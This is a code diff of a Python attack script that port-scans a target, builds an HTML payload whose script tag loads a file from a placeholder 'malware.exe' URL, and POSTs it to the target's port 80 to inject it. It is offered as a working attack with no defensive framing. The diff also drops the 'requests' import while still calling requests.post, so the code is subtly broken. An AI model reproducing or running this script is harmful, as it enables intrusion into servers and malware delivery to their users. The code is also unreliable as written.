@@ -2,10 +2,6 @@
 
 import sys
 import socket
-import requests
-import urllib.parse as urlparse
-import urllib.request as urllib2
-from bs4 import BeautifulSoup
 
 def scan_ports(host, start_port, end_port):
     vulnerable_ports = []
@@ -20,14 +16,33 @@ def scan_ports(host, start_port, end_port):
 
 def create_payload():
     malware_url = "http://example.com/malware.exe"
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
-    }
-    payload = {
-        "command": "echo <html><body><script src='{}'></script></body></html>".format(malware_url)
-    }
-    return payload, headers
+    payload = "<html><body><script src='{}'></script></body></html>".format(malware_url)
+    return payload
 
-def inject_payload(host, port, payload, headers):
+def inject_payload(host, port, payload):
     url = "http://{}:{}".format(host, port)
     if port == 80:
+        headers = {"Content-Type": "text/html"}
+        response = requests.post(url, data=payload, headers=headers)
+        if response.status_code == 200:
+            print("Payload injected successfully at {}:{}".format(host, port))
+        else:
+            print("Failed to inject payload at {}:{}".format(host, port))
+    else:
+        print("Port {} not supported for payload injection".format(port))
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("Usage: {} <host> <start_port> <end_port>".format(sys.argv[0]))
+        sys.exit(1)
+    host = sys.argv[1]
+    start_port = int(sys.argv[2])
+    end_port = int(sys.argv[3])
+    vulnerable_ports = scan_ports(host, start_port, end_port)
+    if vulnerable_ports:
+        print("Vulnerable ports:", vulnerable_ports)
+        payload = create_payload()
+        for port in vulnerable_ports:
+            inject_payload(host, port, payload)
+    else:
+        print("No vulnerable ports found.")
